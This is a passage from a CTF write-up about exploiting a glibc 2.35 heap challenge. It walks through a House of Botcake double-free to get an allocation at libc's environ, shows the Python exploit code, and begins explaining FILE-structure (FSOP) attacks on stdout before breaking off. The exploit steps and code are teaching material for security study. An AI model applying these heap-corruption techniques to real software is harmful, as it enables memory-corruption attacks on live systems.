</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>I kept adding allocs until gdb said the bins were empty. <em>Now</em>, we can start doing some exploit chain... right?</p>
<h2 id="one-more-leak-now-with-cakes-"><a href="#one-more-leak-now-with-cakes-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>One More Leak, now with cakes! <a name="botcake"></a></h2>
<p>If other protections didn’t exist, I would be pretty set. But there’s a couple things in place that prevent me from trying simpler exploits.</p>
<ul>
<li>Full RELRO is enabled, so I cannot overwrite <code>GOT</code> to make libc funcs do something else...</li>
<li>glibc 2.35 removed <code>__free_hook</code> and <code>__malloc_hook</code>, <em>and</em> I don’t have a one gadget available due to seccomp...</li>
<li>Even writing to <code>__exit_funcs</code> isn’t an option. This is different alternative to the <code>hooks</code>, as this is a function table of exit handlers when <code>exit()</code> is called through libc. But this specific program uses <code>_exit()</code> which does <em>not</em> call any exit handlers... <em>and</em> again, seccomp.</li>
</ul>
<p>Unfortunately, this means I need one more leak: The stack. I need to be able to write to the return address of the stack frame to hijack control of the problem. The usual route is a symbol in libc called <code>environ</code>, which stores the address to a position on the stack where the <code>envp</code> array is held. Astute readers will notice the problem with just doing this alone, but lets continue with this route anyway:</p>
<p>We need to get a chunk to exist in libc, rather than the heap. This is the primary goal of most heap pwn, as depending on the program gives you &quot;read what where&quot; or &quot;write what where&quot; primitives anywhere in program memory. There is an excellent repository called <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/tree/master">how2heap</a> which contains tons of POCs for various heap exploits for many versions of glibc. The primative that I’ll be using, which achieves what I need is called <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">House of Botcake</a>.</p>
<p>House of Botcake uses a double free bug to confuse malloc and allow use to return a chunk from an arbitrary location. <code>free()</code> can’t search through the entire heap each time to check whether a chunk is actually free, nor can it always trust the in-use bit, as not every structure on the heap (notably, tcaches) update and respond to the in-use bit. There are some basic detections (like making sure free isn’t called twice in a row on the same block), but it’s easily defeated by just freeing another block in between.</p>
<p>House of Botcake abuses this double free to make a chunk that is part of a consolidated chunk <em>and</em> in the tcache at the same time. I followed <a target="_blank" rel="noopener noreferrer" href="https://ret2school.github.io/post/catastrophe/">this writeup</a> for both botcake usage and a later exploit we need to do:</p>
<ul>
<li>First, we allocate 7 0x200 sized blocks, this will fill the tcache for 0x200 and makes any other frees end up in a different bin.</li>
<li>Then, we allocate a previous chunk, and our victim chunk, each of size 0x200.</li>
<li>We’ll allocate a 16 byte chunk to prevent any further consolidation past our victim chunk</li>
<li>We free those 7 original chunks to actually fill the tcache.</li>
<li>We free our victim chunk, it ends up in the unsorted bin, since its too large for any other bin.</li>
<li>We free our previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x421 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x210 chunks)</li>
<li>We free our victim chunk <em>again</em>. This bypasses the naive double free exception, and since our victim chunk has the info for a 0x210 byte block, it gets placed into the tcache (uh oh).</li>
<li>Now, we alloc a 0x230 sized chunk. Why? Because malloc will split the unsorted block into two, giving us the 0x230 block... but this contains the metadata of our victim chunk, which we now have write control over <em>during</em> our allocation.</li>
<li>When we now alloc a 0x200 block, we’ll get the victim chunk, but then the next address that the tcache is pointed to is any address of our choosing!</li>
</ul>
<p>The exact payload we provide our <code>0x230</code> chunk is explained below, and the complete code for this is as follows:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment"># Get our environment target!</span>
</span><span class="code-line">environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&#x27;environ&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Allocate 7 blocks of size 0x200, we’ll free them later</span>
</span><span class="code-line"><span class="token comment"># We can’t leak them as before, so place them into our mem array properly</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># Allocate our prev block and our victim block, along with the buffer</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;prev&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;victim&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;hello!&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># Fill the tcache!</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    free<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">+</span>i<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># free our victim chunk</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># free our previous chunk (they are now consolidated)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;X&#x27;</span><span class="token punctuation">)</span> <span class="token comment"># Open up a slot in the tcache</span>
</span><span class="code-line"><span class="token comment"># double free vulnerablity, now victim is in the tcache!</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk</span>
</span><span class="code-line"><span class="token comment"># We’re going to write to it the necessary padding then:</span>
</span><span class="code-line"><span class="token comment"># 0x211, to preserve the size of the victim chunk</span>
</span><span class="code-line"><span class="token comment"># environ ^ ((heap + 0x3320) &gt;&gt; 12), because we need to pass a safe-linked ptr.</span>
</span><span class="code-line"><span class="token comment"># Otherwise, malloc will crash. 0x3320 offset was found via debugging.</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x230</span><span class="token punctuation">,</span> <span class="token string">b&#x27;T&#x27;</span><span class="token operator">*</span><span class="token number">0x208</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x211</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>environ <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x3320</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;X&#x27;</span><span class="token punctuation">)</span> <span class="token comment"># remove a from the tcache again, updating the linked list structure</span>
</span><span class="code-line">
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">&#x27;&#x27;</span><span class="token punctuation">)</span> <span class="token comment"># this guy is now located at environ!</span>
</span><span class="code-line">show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Ah, but we run into a slight issue. I <em>have</em> to send a payload, and sending a newline clobbers the address stored by <code>environ</code>. So I need write somewhere that would somehow leak environ for me! There is a method to do this: File Structure Oriented Programming.</p>
<h2 id="rop-i-like-fsop-"><a href="#rop-i-like-fsop-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>ROP? I Like FSOP. <a name="fsop"></a></h2>
<p>I’m going to be honest, when I did this challenge during the CTF, I just saw the line of code that would work for me in the <a target="_blank" rel="noopener noreferrer" href="https://ret2school.github.io/post/catastrophe/">ret2school</a> writeup and copied it. However, I feel that it would be wrong for me to not even try to explain this technique.</p>
<p>If you have ever used pure <code>open, read, write</code> syscalls, you’ll be quite familiar interacting with <em>file descriptors</em>. These are just integer indexes that correspond to a file currently accessible by your program. Traditionally, 0,1,2 are reserved for the linux &quot;files&quot; stdin, stdout, and stderr, which is how you interact with you program. Now, using <code>OWR</code> syscalls can be tedious to use, and libc has provided more feature-rich versions, such as <code>fopen, fprintf, fputc</code>, etc. These don’t use just file descriptors though, instead using a <code>FILE</code> struct, referenced by pointer. Let’s look at the relevant definition, using <a target="_blank" rel="noopener noreferrer" href="https://elixir.bootlin.com/">exlir.bootlin.com</a>, truncated slightly:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span>
</span><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>		<span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current read pointer */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>	<span class="token comment">/* End of get area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of putback+get area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of put area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current put pointer. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>	<span class="token comment">/* End of put area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of reserve area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>	<span class="token comment">/* End of reserve area. */</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
</span><span class="code-line">  __off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it’s too small.  */</span>
</span><span class="code-line">
</span><span class="code-line">  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>
</span><span class="code-line">  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line">
</span><span class="code-line">  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
</span><span class="code-line">  __off64_t _offset<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token comment">/* Wide character stream stuff.  */</span>
</span><span class="code-line">  <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token comment">/* Make sure we don’t get into trouble again.  */</span>
</span><span class="code-line">  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span></code></pre></div>
<p>This struct has several fields, several managing <em>buffering</em>. That function, that every CTF challenge (including this one), <code>setbuf</code>, is a function that updates fields in this struct. Buffering is a great speedup, since calling syscalls every time you want to write a character to the screen, sequentially, is <em>slow</em>. It’s much faster to just write to a buffer for a bit, and eventually flush that buffer to the file descriptor. It might be feasible to hijack what these buffers are doing, and get a &quot;read what where&quot; primative out of it!</p>
<p>Let’s view each fields and disect them:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current read pointer */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>	<span class="token comment">/* End of get area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of putback+get area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of put area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current put pointer. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>	<span class="token comment">/* End of put area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of reserve area. */</span>
</span><span class="code-line">  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>	<span class="token comment">/* End of reserve area. */</span>
</span></code></pre></div>
<p>These fields are somewhat self explanitory: an IO FILE struct maintains pointers to buffers that hold read and write information, specifically denotating where a &quot;cursor&quot; is in each buffer, and where those buffers end. The buffering structure can somewhat be visualized like below. However, often these structures can overlap depending on what is happening with the file descriptor.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">[a a a a a a a _ _ _ _ _ _ _ b b b b b b b c _ _ _ _ _ _ _ ]
</span><span class="code-line"> ^             ^           ^ ^                 ^         ^
</span><span class="code-line"> read_base     read_ptr    read_end
</span><span class="code-line">                             write_base        write_ptr write_end
</span><span class="code-line"> buf_base                                                buf_end
</span></code></pre></div>
<p>We have fields <code>int _flags</code>, <code>int _fileno</code>, <code>__off64_t _offset</code>, <code>FILE* _chain</code>, <code>char _vtable_offset</code>:</p>
<ul>
<li><code>flags</code> is all of the flags that this file descriptor uses, its meant to only be 32 bits, and the top 2 bytes are set to <code>_IO_MAGIC</code> or <code>0xFBAD0000</code>.</li>
<li><code>fileno</code> is the actual, integer file descriptor for this <code>FILE</code>.</li>
<li><code>offset</code> is the byte offset within the file (used for seeking and such).</li>
<li><code>chain</code> is a pointer to the next <code>FILE*</code>, as they are all managed in a singly-linked list.</li>
<li><code>vtable_offset</code> is the offset selector of which vtable we should use for this file pointer. A vtable is a struct containing function ptrs, so that it’s easy to share functions between different structs.</li>
</ul>
<p>So what exactly do we have to do? For starters, if you’ve used <code>fgets()</code> or other functions, then the <code>FILE*</code> for <code>stdout</code> is already defined and called <code>stdout</code> when you use it in your code (compared to <code>STDOUT_FILENO</code> referring to the file descriptor). libc stores a reference to the <code>FILE stdout</code> in a symbol: <code>_IO_2_1_stdout_</code>. Which means, using the arbitrary write primative we built earlier with botcake, we can instead write to the file struct for stdout. But what do we write? We can easily set the flags and buffers to whatever we need, but how does give us an aribtrary read?</p>
<p>Well, with buffering, eventually <code>stdout</code> has to flush the buffer and whatever is in it to the terminal. If we can set up the flags and the buffers in such a way that both prints out <code>environ</code>, without breaking <code>stdout</code>, we have a working arbitrary read primative. I’m heavily following <a target="_blank" rel="noopener noreferrer" href="https://ret2school.github.io/post/catastrophe/">ret2school</a> at this point, adding my own explainations when necessary.</p>
<p>For core functions like <code>putc</code>, there are cases where it will instead flush the buffer and print something else. One of the macros in the <code>FILE.h</code> struct definition is the following:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">__putc_unlocked_body</span><span class="token expression"><span class="token punctuation">(</span>_ch<span class="token punctuation">,</span> _fp<span class="token punctuation">)</span>					</span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">  <span class="token expression"><span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>_fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_end<span class="token punctuation">)</span>	</span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">   <span class="token expression"><span class="token operator">?</span> <span class="token function">__overflow</span> <span class="token punctuation">(</span>_fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>_ch<span class="token punctuation">)</span><span class="token punctuation">)</span>				</span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">   <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_fp<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span>_ch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
</span></code></pre></div>
<p>This macro is called by <code>fputc</code> and <code>putchar</code> (the latter, used with stdout). This checks to see if the file pointer’s write ptr is at or past the end of the write buffer. If so, then we call this <code>__overflow</code> function, otherwise, we write the character to the current position of the write ptr and increment (Recall that postfix <code>++</code> returns the value before incrementing, I love C).</p>
<p>Alright, <code>__overflow</code> will likely flush the buffer, so our first condition is to make the <code>write_ptr</code> equal the <code>write_end</code>. Let’s take a look at <code>__overflow</code> to see what else we need to consider:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token keyword">int</span>
</span><span class="code-line"><span class="token function">__overflow</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token comment">/* This is a single-byte stream.  */</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_mode <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">  <span class="token keyword">return</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>We can assume <code>_mode</code> for stdout is assumed to be non-zero (since it’s not a single byte stream) This means we should look at <code>_IO_OVERFLOW</code>:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token comment">//libio/libioP.h#L146</span>
</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">_IO_OVERFLOW</span><span class="token expression"><span class="token punctuation">(</span>FP<span class="token punctuation">,</span> CH<span class="token punctuation">)</span> <span class="token function">JUMP1</span> <span class="token punctuation">(</span>__overflow<span class="token punctuation">,</span> FP<span class="token punctuation">,</span> CH<span class="token punctuation">)</span></span></span>
</span><span class="code-line"><span class="token comment">// Ok so let’s look at JUMP1: FUNC=__overflow, THIS=stdout, X1=our character</span>
</span><span class="code-line"><span class="token comment">//libio/libioP.h#L124</span>
</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">JUMP1</span><span class="token expression"><span class="token punctuation">(</span>FUNC<span class="token punctuation">,</span> THIS<span class="token punctuation">,</span> X1<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">_IO_JUMPS_FUNC</span><span class="token punctuation">(</span>THIS<span class="token punctuation">)</span><span class="token operator">-&gt;</span>FUNC<span class="token punctuation">)</span> <span class="token punctuation">(</span>THIS<span class="token punctuation">,</span> X1<span class="token punctuation">)</span></span></span>
</span><span class="code-line"><span class="token comment">// Oh jeez: Ok so this grabs the corresponding vtable IO_jump_t, based off of the offset, and the previous macro dereferences the correct function...</span>
</span><span class="code-line"><span class="token comment">//libio/libioP.h#L107</span>
</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name function">_IO_JUMPS_FUNC</span><span class="token expression"><span class="token punctuation">(</span>THIS<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">  <span class="token expression"><span class="token punctuation">(</span>IO_validate_vtable                                                   </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">   <span class="token expression"><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token function">_IO_JUMPS_FILE_plus</span> <span class="token punctuation">(</span>THIS<span class="token punctuation">)</span>	</span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">			     <span class="token expression"><span class="token operator">+</span> <span class="token punctuation">(</span>THIS<span class="token punctuation">)</span><span class="token operator">-&gt;</span>_vtable_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
</span><span class="code-line"><span class="token comment">// And now we have the symbol we care about, _IO_file_overflow</span>
</span><span class="code-line"><span class="token comment">//libio/fileops.c#L1426</span>
</span><span class="code-line"><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> _IO_file_jumps libio_vtable <span class="token operator">=</span>
</span><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line">  JUMP_INIT_DUMMY<span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token function">JUMP_INIT</span><span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
</span><span class="code-line">  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</span><span class="code-line"><span class="token punctuation">}</span>
</span></code></pre></div>
<p>Macro chasing in glibc is usually a nightmare. Let’s look at <code>_IO_file_overflow</code> now:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token comment">//libio/fileops.c#L730</span>
</span><span class="code-line"><span class="token keyword">int</span>
</span><span class="code-line"><span class="token function">_IO_new_file_overflow</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">int</span> ch<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token punctuation">{</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment">/* SET ERROR */</span>
</span><span class="code-line">    <span class="token punctuation">{</span>
</span><span class="code-line">      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
</span><span class="code-line">      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
</span><span class="code-line">    <span class="token punctuation">}</span>
</span><span class="code-line">  <span class="token comment">/* If currently reading or no buffer allocated. */</span>
</span><span class="code-line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token punctuation">{</span>
</span><span class="code-line">      <span class="token comment">/* Allocate a buffer if needed. */</span>
</span><span class="code-line">      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token punctuation">{</span>
</span><span class="code-line">	  <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">	  <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line">	<span class="token punctuation">}</span>
</span><span class="code-line">      <span class="token comment">/* Otherwise must be currently reading.
</span></span><span class="code-line"><span class="token comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
</span></span><span class="code-line"><span class="token comment">	 logically slide the buffer forwards one block (by setting the
</span></span><span class="code-line"><span class="token comment">	 read pointers to all point at the beginning of the block).  This
</span></span><span class="code-line"><span class="token comment">	 makes room for subsequent output.
</span></span><span class="code-line"><span class="token comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that
